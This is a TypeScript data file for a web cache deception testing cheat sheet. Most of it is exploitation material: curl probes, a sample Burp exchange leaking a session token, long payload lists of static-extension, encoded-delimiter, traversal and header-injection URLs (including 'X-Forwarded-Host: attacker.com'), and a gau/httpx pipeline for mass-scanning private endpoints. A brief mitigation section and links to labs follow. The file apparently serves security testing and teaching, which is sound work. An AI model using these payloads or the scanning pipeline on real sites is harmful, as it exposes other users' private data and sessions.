export interface CacheDeceptionCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-06-05"
export const pageDescription = "Advanced Web Cache Deception testing — bypass techniques, payloads, headers, automation, and real-world exploitation methods."

export const cacheDeceptionCategories: CacheDeceptionCategory[] = [
  {
    category: "What is Web Cache Deception?",
    commands: [
      { command: "Web Cache Deception (WCD) occurs when an attacker manipulates a caching system (CDN, reverse proxy, browser) into storing sensitive content under what appears to be a harmless static resource", description: "When another user requests that resource, the cache serves the sensitive data instead, exposing private information" },
      { command: "WCD Attack Flow: 1) Site uses CDN that caches static files (.css, .js, .jpg) 2) Private pages (/account, /profile) should never be cached 3) Attacker appends fake static extension: https://target.com/account/style.css 4) Cache sees .css → treats as static → stores HTML of private page 5) Unauthenticated users get cached private content", description: "Impact: Sensitive data exposure, session hijacking, authentication bypass, complete account takeover" },
    ],
  },
  {
    category: "Cache Fundamentals",
    commands: [
      { command: "Cache Types: Browser Caches (local storage), CDN Caches (edge locations), Reverse Proxy Caches (server-side load reduction)", description: "Browser Cache → stores on user device; CDN Cache → distributed edge locations; Reverse Proxy → reduces origin load" },
      { command: "Cache-Control → Directives for caching behavior; Pragma → HTTP/1.0 cache control; Expires → Specifies response expiry; ETag → Version identifier for resources; Last-Modified → Timestamp of last change", description: "Key cache control headers for WCD analysis" },
      { command: "Cache Keys are based on: Full URL (including query parameters), Selected headers (Host, User-Agent, Accept-Encoding), Cookies (in some configurations)", description: "Understanding cache keys is critical for WCD exploitation" },
    ],
  },
  {
    category: "Key Headers to Analyze",
    commands: [
      { command: "Cache-Control: no-store, no-cache (sensitive); public, max-age=86400 (cached)", description: "Directives controlling caching behavior" },
      { command: "Expires: Future date → likely cached until then", description: "Absolute date/time after which response is stale" },
      { command: "ETag: Present → can validate/compare versions", description: "Validator tag for versioning resources" },
      { command: "Last-Modified: Recent timestamp vs origin changes", description: "Timestamp of last modification" },
      { command: "Vary: Vary: Cookie or missing Cookie → important for auth-sensitive content", description: "Which request headers affect cache key" },
      { command: "X-Cache: HIT = served from cache, MISS = not cached", description: "Proxy/CDN cache status indicator" },
      { command: "Age: Age > 0 → response came from cache", description: "Age of cached object in seconds" },
      { command: "CF-Cache-Status: HIT, MISS, EXPIRED, BYPASS", description: "Cloudflare-specific cache status" },
      { command: "X-Cache-Status: HIT / MISS / STALE / BYPASS", description: "Some CDNs/edge routers use this" },
      { command: "Surrogate-Control: max-age=... or no-store for CDNs", description: "CDN/reverse-proxy cache directives" },
    ],
  },
  {
    category: "Cache Detection & Verification",
    commands: [
      { command: "curl -I https://target.com/account.css", description: "Check if URL is cached — look for X-Cache: HIT, Age > 0, future Expires" },
      { command: "curl -I -H \"Cache-Control: no-cache\" https://target.com/account.css", description: "Send request with cache bypass header" },
      { command: "curl -I https://target.com/account.css ; curl -I https://target.com/account.css?v=$(date +%s)", description: "Cache busting — add unique query parameters to detect caching" },
      { command: "time curl -s -o /dev/null -w \"%{time_total}\" https://target.com/account.css", description: "Timing analysis — cached responses typically have faster response times" },
      { command: "curl -s -D - https://target.com/account.css -o /dev/null | grep -iE 'x-cache|cf-cache|age:|cache-control|expires|etag'", description: "Extract all cache-related headers from response" },
    ],
  },
  {
    category: "WCD Exploitation Example",
    commands: [
      { command: "GET /account.php/poc.css HTTP/1.1\nHost: vulnerable-example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0)\nAccept: text/css,*/*;q=0.1\nCache-Control: no-cache", description: "Burp Request — Append .css to PHP endpoint to trick CDN into caching" },
      { command: "HTTP/1.1 200 OK\nDate: Mon, 11 Aug 2025 09:40:18 GMT\nContent-Type: text/css\nContent-Length: 412\nCache-Control: public, max-age=86400\nX-Cache: HIT\n\n/* Cached response exposing sensitive data */\nbody { background-color: #fff; }\n\n/* Attacker view */\nusername: johndoe@example.com\nemail: johndoe@example.com\nsession_token: 9f73b21d2e934f6e4cbdc8d83c4e9210", description: "Burp Response — CDN caches sensitive HTML/PHP output as static CSS with Content-Type: text/css. Anyone visiting gets cached data without auth" },
    ],
  },
  {
    category: "Identifying Cacheable Endpoints",
    commands: [
      { command: "/account /profile /dashboard /settings /user /admin /private /my-account /user/profile /dashboard/image /dashboard/profile /account/user /address /account/settings /profile/edit /user/settings /admin/panel /private/files /my-account/orders /user/details /dashboard/reports /account/profile /account/info /profile/view /admin/settings /private/data /my-account/settings /user/account", description: "Sensitive paths to test for cache deception — these typically contain user-specific information" },
    ],
  },
  {
    category: "File Extensions to Test",
    commands: [
      { command: ".css .js .svg .asp .aspx .atom .bak .bin .cgi .csv .do .eot .exe .fake.js .gif .html .ico .jpg .jpeg .json .jsp .mp3 .mp4 .old .pdf .php .png .rss .tar.gz .tmp .ttf .txt .webm .woff .woff2 .xml .zip .7z", description: "Append these extensions to dynamic endpoints: /dashboard.png /user.js /admin.css /orders.jpg" },
      { command: "/admin.css/login /account.js/test /settings/fake.js /orders/test/style.css", description: "Try fake directories with extensions" },
    ],
  },
  {
    category: "WCD Payload Techniques",
    commands: [
      { command: "https://target.com/account.css", description: "Path Poison — append static extension directly" },
      { command: "https://target.com/profile.html", description: "Path Poison — using .html extension" },
      { command: "https://target.com/account%2fstyle.css", description: "Obfuscated Path — URL-encoded slash" },
      { command: "https://target.com/profile%3ftest=1.js", description: "Obfuscated Path — encoded query" },
      { command: "https://target.com/account;random.js", description: "Using Delimiters — semicolon injection" },
      { command: "https://target.com/profile@anything.css", description: "Using Delimiters — @ symbol injection" },
    ],
  },
  {
    category: "Force Cache with Special Headers",
    commands: [
      { command: "X-Original-URL: /admin/", description: "Force cache to process different URL path" },
      { command: "X-Rewrite-URL: /profile/", description: "Rewrite URL to sensitive endpoint" },
      { command: "X-Forwarded-Host: attacker.com", description: "Spoof forwarded host for cache manipulation" },
      { command: "X-Forwarded-Path: /static.css", description: "Inject static path to trick caching rules" },
      { command: "curl -H \"X-Original-URL: /admin/\" https://target.com/dashboard/style.css", description: "Combine header injection with static extension" },
      { command: "curl -H \"X-Forwarded-Path: /static.css\" https://target.com/account", description: "Test X-Forwarded-Path for cache deception" },
    ],
  },
  {
    category: "Bypassing with Encoded Paths",
    commands: [
      { command: "https://target.com/settings/%2e%2e/images/logo.png", description: "Dot-dot-slash encoding to bypass cache rules" },
      { command: "https://target.com/admin/%2e%2e/scripts/app.js", description: "Admin path traversal with encoding" },
      { command: "https://target.com/profile/%2e%2e/assets/styles.css", description: "Profile traversal to static asset" },
      { command: "https://target.com/billing/%2e%2e/fonts/main.woff", description: "Billing data exposed as font file" },
      { command: "https://target.com/api/v2/orders/%2e%2e/public/data.json", description: "API orders traversed to JSON" },
      { command: "https://target.com/user/%2e%2e/favicon.ico", description: "User data as favicon" },
    ],
  },
  {
    category: "Injecting Cache Keys with Query Parameters",
    commands: [
      { command: "https://target.com/account?file=main.js", description: "Query param with .js extension" },
      { command: "https://target.com/settings?theme=dark.css", description: "Theme parameter with .css value" },
      { command: "https://target.com/user?resource=profile.jpg", description: "Resource parameter with .jpg value" },
      { command: "https://target.com/admin?view=dashboard.png", description: "Admin view as .png" },
      { command: "https://target.com/api?callback=static.js", description: "API callback as static JS" },
      { command: "https://target.com/profile.js?test=123", description: "Profile with .js extension + query" },
      { command: "https://target.com/account.css?test=123", description: "Account with .css + query" },
      { command: "https://target.com/settings.jpeg?test=123", description: "Settings as JPEG + query" },
      { command: "https://target.com/dashboard.jpg?test=123", description: "Dashboard as JPG + query" },
    ],
  },
  {
    category: "Delimiters & Special Characters",
    commands: [
      { command: "~ \\ / \\ ; : // / .. . _ - @ ? = # ## !* ! & $", description: "Delimiters to manipulate URLs and bypass cache rules" },
      { command: "%5c %3d %2f %2e %26 %23 %20 %0a %09 %00", description: "Encoded delimiters — backslash, equals, slash, dot, ampersand, hash, space, newline, tab, null" },
      { command: "https://target.com/account~style.css", description: "Tilde delimiter" },
      { command: "https://target.com/profile\\/test.js", description: "Backslash delimiter" },
      { command: "https://target.com/settings;v2.png", description: "Semicolon delimiter" },
      { command: "https://target.com/user:data.css", description: "Colon delimiter" },
      { command: "https://target.com/admin//panel.js", description: "Double slash" },
      { command: "https://target.com/private/../secret.css", description: "Path traversal" },
      { command: "https://target.com/profile.edit.jpg", description: "Dot separator" },
      { command: "https://target.com/user_name-test.gif", description: "Underscore + dash" },
      { command: "https://target.com/account@cache.png", description: "At symbol" },
      { command: "https://target.com/profile#section.css", description: "Hash fragment" },
      { command: "https://target.com/user##details.js", description: "Double hash" },
      { command: "https://target.com/profile&token=123.css", description: "Ampersand parameter" },
      { command: "https://target.com/account$hidden.js", description: "Dollar sign" },
      { command: "https://target.com/settings%5cencoded.jpg", description: "Encoded backslash" },
      { command: "https://target.com/user%2ffile.js", description: "Encoded forward slash" },
      { command: "https://target.com/admin%2eedit.png", description: "Encoded dot" },
      { command: "https://target.com/private%26data.css", description: "Encoded ampersand" },
      { command: "https://target.com/profile%23hash.js", description: "Encoded hash" },
      { command: "https://target.com/account%20space.jpg", description: "URL-encoded space" },
      { command: "https://target.com/settings%0anewline.css", description: "Newline injection" },
      { command: "https://target.com/dashboard%09tab.js", description: "Tab character injection" },
      { command: "https://target.com/user%00nullbyte.png", description: "Null byte injection" },
    ],
  },
  {
    category: "Special Delimiter Testing",
    commands: [
      { command: ";.js?test=123 ;.css?test=123 ;.jpeg?test=123 ;.jpg?test=123 ;.png?test=123 ;.gif?test=123 ;.woff?test=123 ;.woff2?test=123 ;.ttf?test=123 ;.otf?test=123 ;.svg?test=123 ;.html?test=123 ;.xml?test=123 ;.json?test=123 ;.mp4?test=123 ;.ico?test=123 .txt?test=123 .pdf?test=123 .zip?test=123 .csv?test=123", description: "Insert semicolon before file extensions with cache key params" },
      { command: "https://target.com/account;.js?test=123", description: "Semicolon + .js query param" },
      { command: "https://target.com/profile;.css?test=123", description: "Semicolon + .css query param" },
      { command: "https://target.com/settings;.jpeg?test=123", description: "Semicolon + .jpeg query param" },
      { command: "https://target.com/dashboard;.jpg?test=123", description: "Semicolon + .jpg query param" },
      { command: "https://target.com/user;.png?test=123", description: "Semicolon + .png query param" },
      { command: "https://target.com/admin;.gif?test=123", description: "Semicolon + .gif query param" },
      { command: "https://target.com/private;.woff?test=123", description: "Semicolon + .woff query param" },
      { command: "https://target.com/account;.woff2?test=123", description: "Semicolon + .woff2" },
      { command: "https://target.com/profile;.ttf?test=123", description: "Semicolon + .ttf" },
      { command: "https://target.com/settings;.otf?test=123", description: "Semicolon + .otf" },
      { command: "https://target.com/dashboard;.svg?test=123", description: "Semicolon + .svg" },
      { command: "https://target.com/user;.html?test=123", description: "Semicolon + .html" },
      { command: "https://target.com/admin;.xml?test=123", description: "Semicolon + .xml" },
      { command: "https://target.com/private;.json?test=123", description: "Semicolon + .json" },
    ],
  },
  {
    category: "Encoded Delimiter Testing",
    commands: [
      { command: "%60.js?test=123 %60.css?test=123 %60.jpeg?test=123 %60.jpg?test=123 %60.png?test=123 %60.gif?test=123 %60.woff?test=123 %60.woff2?test=123 %60.ttf?test=123 %60.otf?test=123 %60.svg?test=123 %60.html?test=123 %60.xml?test=123 %60.json?test=123 %60.mp4?test=123 %60.ico?test=123 %60.txt?test=123 %60.pdf?test=123 %60.zip?test=123 %60.csv?test=123", description: "Backtick encoding (%60) before file extensions with query params" },
      { command: "https://target.com/account%60.js?test=123", description: "Encoded backtick + .js" },
      { command: "https://target.com/profile%60.css?test=123", description: "Encoded backtick + .css" },
      { command: "https://target.com/settings%60.jpeg?test=123", description: "Encoded backtick + .jpeg" },
      { command: "https://target.com/dashboard%60.jpg?test=123", description: "Encoded backtick + .jpg" },
      { command: "https://target.com/user%60.png?test=123", description: "Encoded backtick + .png" },
      { command: "https://target.com/admin%60.gif?test=123", description: "Encoded backtick + .gif" },
      { command: "https://target.com/private%60.woff?test=123", description: "Encoded backtick + .woff" },
      { command: "https://target.com/account%60.woff2?test=123", description: "Encoded backtick + .woff2" },
      { command: "https://target.com/profile%60.ttf?test=123", description: "Encoded backtick + .ttf" },
      { command: "https://target.com/settings%60.otf?test=123", description: "Encoded backtick + .otf" },
      { command: "https://target.com/dashboard%60.svg?test=123", description: "Encoded backtick + .svg" },
      { command: "https://target.com/user%60.html?test=123", description: "Encoded backtick + .html" },
      { command: "https://target.com/admin%60.xml?test=123", description: "Encoded backtick + .xml" },
      { command: "https://target.com/private%60.json?test=123", description: "Encoded backtick + .json" },
    ],
  },
  {
    category: "Advanced Testing Combinations",
    commands: [
      { command: ".js/* .css/* .jpeg/* .jpg/* .png/* .gif/* .woff/* .woff2/* .ttf/* .otf/* .svg/* .html/* .xml/* .json/* .mp4/* .webm/* .ico/* .txt/* .pdf/* .doc/* .xls/* .ppt/* .mp3/* .ogg/* .wav/* .csv/* .swf/* .zip/* .tar/* .gz/* .bz2/* .7z/*", description: "Append extension + /* to trick caches into storing sensitive responses" },
      { command: "https://target.com/account.js/*", description: ".js with trailing /*" },
      { command: "https://target.com/profile.css/*", description: ".css with trailing /*" },
      { command: "https://target.com/settings.jpeg/*", description: ".jpeg with trailing /*" },
      { command: "https://target.com/dashboard.jpg/*", description: ".jpg with trailing /*" },
      { command: "https://target.com/user.png/*", description: ".png with trailing /*" },
      { command: "https://target.com/admin.gif/*", description: ".gif with trailing /*" },
      { command: "https://target.com/private.woff/*", description: ".woff with trailing /*" },
      { command: "https://target.com/account.woff2/*", description: ".woff2 with trailing /*" },
      { command: "https://target.com/profile.ttf/*", description: ".ttf with trailing /*" },
      { command: "https://target.com/settings.otf/*", description: ".otf with trailing /*" },
      { command: "https://target.com/dashboard.svg/*", description: ".svg with trailing /*" },
      { command: "https://target.com/user.html/*", description: ".html with trailing /*" },
      { command: "https://target.com/admin.xml/*", description: ".xml with trailing /*" },
      { command: "https://target.com/private.json/*", description: ".json with trailing /*" },
    ],
  },
  {
    category: "Real-World Example — Profile Page Poisoning",
    commands: [
      { command: "Discovery: A tester noticed that /user/profile contained sensitive user information. Testing: Appended static extension → /user/profile.css. Verification: After logging out and accessing /user/profile.css in incognito, the same sensitive profile data was returned.", description: "Root Cause: CDN cached based on file extension, treating .css URL as static resource while backend still processed it as a profile request" },
      { command: "curl -I https://target.com/user/profile.css", description: "Test if the profile page is cached with .css extension" },
      { command: "curl https://target.com/user/profile.css | grep -iE 'email|username|session|token|ssn|credit|phone'", description: "Verify cached content exposes sensitive user data" },
    ],
  },
  {
    category: "Real-World Example — API Endpoint Manipulation",
    commands: [
      { command: "Discovery: An API endpoint at /api/user/data returned JSON with user-specific information. Testing: Added cache-busting parameter with static extension → /api/user/data?callback=static.js. Verification: When accessed without authentication, the endpoint returned the cached user data.", description: "Root Cause: CDN configured to cache based on presence of certain query parameters, ignoring the dynamic nature of the response" },
      { command: "curl -I \"https://target.com/api/user/data?callback=static.js\"", description: "Test API endpoint with callback parameter mimicking static JS" },
      { command: "curl \"https://target.com/api/user/data?callback=static.js\"", description: "Retrieve cached API response — may expose user data without auth" },
    ],
  },
  {
    category: "WCD Exploitation Checklist",
    commands: [
      { command: "1) Identify private endpoint 2) Append static-like extension 3) Test caching: curl -I https://target.com/account.css 4) Look for cache hit headers 5) Verify sensitive content exposure 6) Try multiple variations for bypass", description: "Simple exploitation checklist" },
      { command: "gau target.com | grep -E '/(account|profile|dashboard|settings|user|admin|private|my-account|user/profile|dashboard/image|dashboard/profile|account/user|address|account/settings|profile/edit|user/settings|admin/panel|private/files|my-account/orders|user/details|dashboard/reports|account/profile|account/info|profile/view|admin/settings|private/data|my-account/settings|user/account)(\\?|/|$)' > urls.txt", description: "Gather URLs and filter for sensitive paths" },
      { command: "cat urls.txt | while read url; do echo \"$url/style.css\"; done | httpx-toolkit -mc 200 -title -cl", description: "Append /style.css to each URL and check for HTTP 200 responses — find live pages cached improperly" },
    ],
  },
  {
    category: "Prevention & Mitigation",
    commands: [
      { command: "Ensure sensitive endpoints include: Cache-Control: no-store, no-cache, private", description: "Proper Cache-Control Headers" },
      { command: "Configure caches to include authentication status or session identifiers in cache keys", description: "Cache Key Configuration — include auth status in cache keys" },
      { command: "Implement URL normalization to prevent encoded paths from bypassing cache rules", description: "URL Normalization" },
      { command: "Host static resources on separate domains or subdomains with different caching policies", description: "Static Resource Segregation" },
    ],
  },
]

export const cacheDeceptionTools = [
  {
    name: "Web Cache Deception Scanner (PortSwigger)",
    url: "https://github.com/PortSwigger/web-cache-deception-scanner",
    description: "Burp Suite extension for automated web cache deception scanning",
  },
  {
    name: "PortSwigger WCD Lab",
    url: "https://portswigger.net/web-security/web-cache-deception",
    description: "Interactive practice lab for web cache deception",
  },
  {
    name: "GiftOfSpeed Cache Checker",
    url: "https://www.giftofspeed.com/cache-checker/",
    description: "Online tool to analyze HTTP responses and determine if a resource is cached",
  },
  {
    name: "YouTube: WCD Walkthrough",
    url: "https://www.youtube.com/watch?v=Epzi1fWwdKk",
    description: "Full practical demonstration including account takeover via cache deception",
  },
]
